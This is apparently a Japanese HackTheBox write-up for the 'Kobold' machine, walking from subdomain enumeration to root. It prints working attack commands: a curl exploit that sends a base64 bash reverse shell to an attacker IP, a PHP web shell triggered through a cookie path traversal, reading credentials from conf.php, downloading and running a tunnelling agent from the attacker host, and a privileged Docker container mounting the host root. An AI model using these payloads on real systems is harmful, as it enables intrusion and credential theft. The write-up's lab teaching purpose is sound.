🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Kobold: HackTheBox ライトアップ

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2ff7f3683782c3525c5ac9ed275cc989.png" width="120"/>
<div>

**難易度**: Easy  
**OS**: Linux  
**タイプ**: Web / Docker  

</div>
</div>

---

## 攻撃チェーンの概要

```
nmap → kobold.htb
  → ffuf → mcp.kobold.htb + bin.kobold.htb
  → CVE-2026-23744 (MCPJam RCE) → shell ben
  → CVE-2025-49596 (PrivateBin LFI via cookie template)
  → 認証情報の抽出 (conf.php)
  → Arcane 管理者アクセス
  → Docker コンテナ作成 (root マウント)
  → ROOT
```

---

## 列挙

### Nmap スキャン

```bash
nmap -sV -sC <TARGET_IP> -oN scan.txt
```

開放ポート：

| ポート | サービス | バージョン |
|--------|---------|-----------|
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu |
| 80   | HTTP    | nginx 1.24.0 (リダイレクト → HTTPS) |
| 443  | HTTPS   | nginx 1.24.0、`kobold.htb` |

TLS 証明書からドメイン `kobold.htb` およびワイルドカード `*.kobold.htb` が判明。

### /etc/hosts への追加

```bash
echo "<TARGET_IP> kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

### メインページ: mcp.kobold.htb

`https://kobold.htb` を閲覧すると、`mcp.kobold.htb`（MCPJam Inspector）への直接リンクが確認できる。

### サブドメイン探索 (ffuf)

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://<TARGET_IP> \
  -H "Host: FUZZ.kobold.htb" \
  -k -mc 200,301,302,403 -fs 154
```

結果：
```
bin   [Status: 200, Size: ...]
```

- `bin.kobold.htb` → PrivateBin インスタンス

---

## 初期侵入: CVE-2026-23744 (MCPJam RCE)

### バージョンの特定

`https://mcp.kobold.htb` にアクセス → Settings → **MCPJam Version: v1.4.2**

このバージョンは **CVE-2026-23744** に脆弱：`/api/mcp/connect` エンドポイントが `command` フィールドに渡されたコマンドを認証チェックなしで任意に実行する。

### エクスプロイト

**リスナー：**
```bash
nc -lvnp 4444
```

**リバースシェルペイロード (base64)：**
```bash
echo 'bash -i >& /dev/tcp/<攻撃者IP>/4444 0>&1' | base64

curl -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "echo <BASE64> | base64 -d | bash"],
      "env": {}
    },
    "serverId": "pwn"
  }'
```

`ben` としてシェルを取得。

---

## ユーザーフラグ

```bash
ben@kobold:~$ cat user.txt
<USER_FLAG>
```

---

## 侵入後の列挙

### 主要情報

```bash
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

cat /etc/group | grep docker
# docker:x:111:alice

ss -tlnp
# 127.0.0.1:8080  → PrivateBin (Docker コンテナ)
# 127.0.0.1:6274  → MCPJam Inspector
# *:3552          → Arcane (Docker マネージャー)
```

### Nginx: 内部サブドメイン

```bash
cat /etc/nginx/sites-enabled/*
```

- `bin.kobold.htb` → `127.0.0.1:8080` へのプロキシ (Docker 内の PrivateBin)
- `mcp.kobold.htb` → `127.0.0.1:6274` へのプロキシ (MCPJam)

### operator グループ: /privatebin-data へのアクセス

```bash
find / -group operator -readable 2>/dev/null
```

`operator` グループ (`ben` が所属) は `/privatebin-data/data/` への読み書き権限を持つ (`drwxrwxrwx`)。

---

## 権限昇格 1: CVE-2025-49596 (PrivateBin LFI via cookie template)

### 概要

PrivateBin **2.0.2**、設定に `templateselection = true` あり。CVE-2025-49596 は `template` クッキーを悪用し、`tpl/` フォルダからの相対パストラバーサルで任意の PHP ファイルをインクルードする。

### ウェブシェルの書き込み

`ben` シェルから、ワールドライタブルなフォルダに PHP ウェブシェルを書き込む：

```bash
echo '<?php system($_GET["cmd"]); ?>' > /privatebin-data/data/shell.php
```

### LFI のトリガー

```bash
curl -sk --cookie "template=../data/shell" \
  "https://bin.kobold.htb/?cmd=id"
# → uid=65534(nobody) gid=82(www-data) groups=82(www-data)
```

ウェブシェルは PrivateBin コンテナのコンテキスト内で動作する。

### 認証情報の抽出

```bash
curl -sk --cookie "template=../data/shell" \
  "https://bin.kobold.htb/?cmd=cat+/srv/cfg/conf.php"
```

PrivateBin の設定にコメントアウトされているが有効な MySQL セクションが存在：

```ini
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
usr = "privatebin"
pwd = "<PRIVATEBIN_PASSWORD>"
```

---

## 権限昇格 2: Arcane 管理者アクセス

### Ligolo-ng トンネル

ポート 3552 (Arcane) はローカルホストからのみアクセス可能。トンネルを構築する：

**Kali：**
```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

**ben シェル：**
```bash
cd /tmp
curl http://<攻撃者IP>:8080/agent -o agent && chmod +x agent
./agent -connect <攻撃者IP>:11601 -ignore-cert
```

**Ligolo CLI：**
```
session → start
listener_add --addr 0.0.0.0:3552 --to 127.0.0.1:3552 --tcp
```

### Arcane へのログイン

ブラウザで `http://127.0.0.1:3552` にアクセス。

```
Username: arcane
Password: <PRIVATEBIN_PASSWORD>
```

インターフェース：**Arcane v1.13.0**、`unix:///var/run/docker.sock` ソケットにアクセスできる Docker マネージャー。

---

## 権限昇格 3: Docker エスケープ → ROOT

### 悪意のあるコンテナの作成

Arcane → Containers → **Create Container**：

**Basic：**
- Container Name: `pwn`
- Image: `privatebin/nginx-fpm-alpine:2.0.2` (ローカルに既に存在)
- User: `root`
- I/O: Allocate TTY、Attach stdin

**Volumes (テキスト形式)：**
```
/:/hostfs
```

**Network & Security：**
- Privileged モード

### root フラグの取得

Arcane の内蔵シェル (コンテナの Shell タブ) から：

```sh
/var/www # whoami
root
/var/www # cat /hostfs/root/root.txt
<USER_FLAG>
```
